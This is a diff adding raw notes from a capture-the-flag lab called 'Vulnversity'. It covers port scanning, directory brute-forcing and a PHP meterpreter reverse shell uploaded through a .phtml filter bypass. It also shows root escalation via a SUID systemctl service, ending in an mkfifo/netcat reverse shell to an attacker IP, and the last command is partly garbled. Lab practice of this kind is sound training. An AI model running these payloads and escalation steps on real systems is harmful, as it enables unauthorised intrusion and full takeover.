@@ -1,0 +1,98 @@
+Vulnversity
+
+nmap -sn 10.10.80.8
+nmap -Pn -sV 10.10.80.8
+
+feroxbuster -u http://10.10.80.8:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+http://10.10.80.8:3333/internal/
+http://10.10.80.8:3333/internal/uploads/
+
+msfvenom -p php/meterpreter/reverse_tcp lhost=10.11.9.12 lport=4444 -f raw > shell.php
+
+nc -lvnp 4444
+
+OR
+
+msfconsole
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST your-ip 
+set LPORT listening-port run
+
+Upload Error
+
+Extension not allowed
+.php NOT ALLOWED
+.php3 NOT ALLOWED
+.php4 NOT ALLOWED
+.php5 NOT ALLOWED
+.phtml ALLOWED
+
+SUCCESS
+
+GOT METERPRETER!!
+
+meterpreter > shell 
+python -c 'import pty; pty.spawn("/bin/sh")'
+export TERM=xterm
+$ cd /
+$ cd home
+$ cd bill
+$ cat user.txt  
+
+8bd7992fbe8a6ad22a63361004cfcedb
+
+
+find / -perm /4000
+
+https://gtfobins.github.io/
+
+READ FLAG:
+
+cd /bin
+sh
+
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart= /bin/bash -c "cat /root/root.txt > /tmp/output.txt"
+[Install]
+WantedBy=multi-user.target' > $TF
+./systemctl link $TF
+./systemctl enable --now $TF
+
+$ cd /tmp
+$ cat output.txt
+a58ff8579f0a9270368d33a9966c7fd5
+
+ROOT SHELL:
+
+cd /bin
+sh
+
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart= /bin/sh -c "chmod +s /bin/bash"
+[Install]
+WantedBy=multi-user.target' > $TF
+./systemctl link $TF
+./systemctl enable --now $TF
+bash -p
+
+
+GOT ROOT Shell.
+
+OR 
+
+nc -lvnp 1234
+
+cd /bin
+su
+ken=$(mktemp).service
+echo '[Service]
+ExecStart=/bin/sh -c "/tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc 10.11.9.12 1234"
+[Install]
+WantedBy=multi-user.target' >$ken/bin/systemctl link $ken
+/bin/systemctl enable --now $ken
